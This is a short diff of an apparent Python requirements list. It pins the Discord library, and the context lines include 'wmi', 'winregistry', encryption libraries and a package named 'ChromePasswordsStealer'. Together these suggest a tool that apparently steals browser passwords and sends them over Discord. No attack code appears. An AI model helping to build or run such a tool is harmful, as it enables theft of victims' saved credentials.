@@ -12,7 +12,7 @@ tinyaes
 pycryptodome
 addict
 regex
-discord
+discord.py=1.7.3
 wmi
 ChromePasswordsStealer
 winregistry
